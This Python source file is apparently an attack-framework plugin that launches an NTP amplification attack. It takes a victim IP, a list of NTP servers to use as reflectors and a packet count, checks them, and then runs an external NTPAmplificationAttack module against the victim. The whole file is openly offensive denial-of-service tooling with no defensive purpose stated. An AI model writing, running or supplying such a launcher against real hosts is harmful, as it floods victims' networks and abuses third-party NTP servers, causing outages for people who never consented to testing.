"""Perform NTP amplification attack"""

import argparse
import sys
import os
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class NtpAmplification(AttackBase):
    """Perform NTP amplification attack"""

    name = "ntp-amplification"
    description = "Perform NTP amplification attack"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument('--victim', required=True, help='Victim IP address')
        parser.add_argument('--ntp-servers', required=True, help='NTP server IPs (comma-separated)')
        parser.add_argument('--count', type=int, default=100, help='Number of packets (default: 100)')
        parser.add_argument('--verbose', action='store_true', help='Verbose output')

    def validate(self, args: argparse.Namespace) -> bool:
        # Validate victim IP
        if not self.validator.validate_ip(args.victim, allow_private=True, allow_loopback=False):
            logger.error(f"Invalid victim IP address: {args.victim}")
            return False

        # Validate NTP servers (comma-separated list)
        ntp_servers = [s.strip() for s in args.ntp_servers.split(',')]
        if not ntp_servers or len(ntp_servers) == 0:
            logger.error("No NTP servers provided")
            return False

        for server in ntp_servers:
            if not self.validator.validate_ip(server, allow_private=True, allow_loopback=False):
                logger.error(f"Invalid NTP server IP address: {server}")
                return False

        # Validate count
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}. Must be greater than 0")
            return False
        if args.count > 10000:
            logger.warning(f"Large packet count ({args.count}) may cause network disruption")

        return True

    def run(self, args: argparse.Namespace) -> None:
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        path = os.path.join(scripts_dir, 'ntp_amplification')
        sys.path.insert(0, path)
        try:
            import ntp_amplification as attack_module
            logger.info(f"Running ntp-amplification attack")

            # Parse NTP servers list
            ntp_servers = [s.strip() for s in args.ntp_servers.split(',')]

            # Create and execute attack
            attack = attack_module.NTPAmplificationAttack(
                args.victim,
                ntp_servers,
                args.count,
                args.verbose
            )
            attack.execute()
        except Exception as e:
            logger.error(f"Attack failed: {e}")
            raise
        finally:
            sys.path.remove(path)
